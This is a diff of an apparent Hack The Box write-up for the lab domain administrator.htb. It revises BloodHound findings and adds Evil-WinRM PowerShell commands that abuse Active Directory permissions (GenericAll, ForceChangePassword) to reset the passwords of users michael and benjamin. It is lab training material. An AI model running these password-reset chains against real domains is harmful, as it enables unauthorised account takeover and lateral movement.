@@ -572,13 +572,12 @@ C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini BUILTIN
 Access is denied.
 ```
 
-bloodhound generic write on user michael from user olivia:
+bloodhound generic all on user michael from user olivia:
 ![image](https://github.com/user-attachments/assets/9fa0fa4a-94ee-4ba1-8475-c58014d74e73)
 
-set SPN for user michael since we have generic write:
+set SPN for user michael since we have generic all:
 ```bash
-
-*Evil-WinRM* PS C:\> Get-ADUser michael
+*Evil-WinRM* PS C:\Users\olivia> Get-ADUser michael
 
 
 DistinguishedName : CN=Michael Williams,CN=Users,DC=administrator,DC=htb
@@ -650,7 +649,17 @@ Hardware.Mon.#1..: Temp: 48c Util: 52%
 
 since no result, try changing michael password directly:
 ```bash
-*Evil-WinRM* PS C:\> $newpass = ConvertTo-SecureString "YourNewPassword123!" -AsPlainText -Force
-*Evil-WinRM* PS C:\> Set-ADAccountPassword -Identity michael -NewPassword $newpass -Server administrator.htb -Verbose
+*Evil-WinRM* PS C:\Users\olivia> $newpass = ConvertTo-SecureString "YourNewPassword123!" -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\olivia> Set-ADAccountPassword -Identity michael -NewPassword $newpass -Server administrator.htb -Verbose
 Verbose: Performing the operation "Set-ADAccountPassword" on target "CN=Michael Williams,CN=Users,DC=administrator,DC=htb".
+```
+
+bloodhound force change password on user benjamin from user michael:
+![image](https://github.com/user-attachments/assets/fa41c00a-6e35-4b20-9136-db97005f2465)
+
+connect as michael since we changed password and force change password for user benjamin:
+```bash
+*Evil-WinRM* PS C:\Users\michael> $newpass = ConvertTo-SecureString "YourNewPassword123!" -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\michael> Set-ADAccountPassword -Identity benjamin -NewPassword $newpass -Server administrator.htb -Verbose
+Verbose: Performing the operation "Set-ADAccountPassword" on target "CN=Benjamin Brown,CN=Users,DC=administrator,DC=htb".
 ```
